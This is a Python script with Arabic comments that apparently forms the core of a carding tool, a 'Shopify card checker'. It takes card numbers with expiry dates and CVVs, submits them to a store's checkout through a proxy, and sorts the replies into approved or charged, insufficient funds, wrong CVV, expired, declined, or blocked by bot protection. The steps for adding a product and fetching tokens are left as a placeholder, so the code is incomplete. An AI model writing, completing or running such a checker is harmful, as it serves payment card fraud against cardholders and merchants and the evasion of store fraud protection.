import aiohttp
from bs4 import BeautifulSoup
import re

async def check_shopify_card(cc, site, proxy):
    card_num, month, year, cvv = cc.split("|")
    
    base_url = f"https://{site}"
    checkout_url = f"https://{site}/checkout"
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    async with aiohttp.ClientSession(headers=headers) as session:
        try:
            # [هنا توضع خطوات إضافة المنتج وجلب التوكنز وبيانات الشحن والـ Vaulting]
            # ...
            
            # نفترض هنا أننا أرسلنا طلب الدفع النهائي ونستقبل الرد (response)
            # سنقوم بقراءة محتوى الصفحة النهائي والرابط الذي استقرينا عليه (Final URL)
            async with session.post(checkout_url, data={}, proxy=proxy) as r:
                html_content = await r.text()
                final_url = str(r.url)
            
            # تحويل النص إلى حروف صغيرة لتسهيل البحث المطابق
            response_text = html_content.lower()
            
            # 1. فحص حالة النجاح الكامل (Charged / Approved)
            if "thank_you" in final_url or "order_confirmed" in final_url or "شكرا لك" in html_content:
                return "🟢 APPROVED / CHARGED (تم الخصم بنجاح)"
                
            # 2. استخراج نص الخطأ من الصفحة لو كان موجوداً في وسم التنبيهات الخاص بشوبيفاي
            soup = BeautifulSoup(html_content, 'html.parser')
            notice_element = soup.find(class_=re.compile("notice__text|error-message|warning"))
            error_reason = notice_element.text.strip().lower() if notice_element else ""

            # 3. نظام الفلترة والتصنيف بناءً على الكلمات المفتاحية في الصفحة أو في نص الخطأ
            
            # حالة: رصيد غير كافٍ (Insufficient Funds)
            if any(x in response_text or x in error_reason for x in ["insufficient", "funds", "رصيد غير كاف"]):
                return "🟡 INSUFFICIENT FUNDS (الكرت شغال لكن رصيده صفر)"
                
            # حالة: كود الأمان خطأ (Wrong CVV)
            elif any(x in response_text or x in error_reason for x in ["security code is incorrect", "cvv", "incorrect_cvv"]):
                return "🟠 WRONG CVV (البيانات صحيحة لكن الـ CVV خطأ)"
                
            # حالة: الكرت منتهي الصلاحية (Expired Card)
            elif any(x in response_text or x in error_reason for x in ["expiration", "expired", "تاريخ الانتهاء غير صحيح"]):
                return "❌ EXPIRED CARD (البطاقة منتهية الصلاحية)"
                
            # حالة: البطاقة مرفوضة تماماً (Declined / Dead)
            elif any(x in response_text or x in error_reason for x in ["declined", "tarjeta rechazada", "مرفوضة", "card_declined"]):
                return "🔴 DECLINED / DEAD (البطاقة ميتة أو محظورة)"
                
            # حالة: حظر البوت أو حماية المتجر (Cloudflare / Captcha)
            elif any(x in response_text for x in ["cloudflare", "captcha", "challenge", "robot"]):
                return "⚠️ BLOCKED BY PROTECTION (حماية المتجر حظرت الطلب)"
                
            # في حال رجع رد غير معروف ولم يطابق الفلاتر أعلاه
            else:
                # نرجع أول 50 حرف من رسالة الخطأ لنعرف المشكلة
                return f"❓ UNKNOWN RESP (رد غريب): {error_reason[:50] if error_reason else 'No specific error text'}"
                
        except aiohttp.ClientError:
            return "🌐 PROXY / SITE ERROR (مشكلة في البروكسي أو الموقع لا يستجيب)"
        except Exception as e:
            # هنا نمسك أي خطأ برمجي غير متوقع حتى لا يتوقف السكربت ويرجع لنا نوع الخطأ
            return f"🛠️ INTERNAL ERROR: {str(e)}"
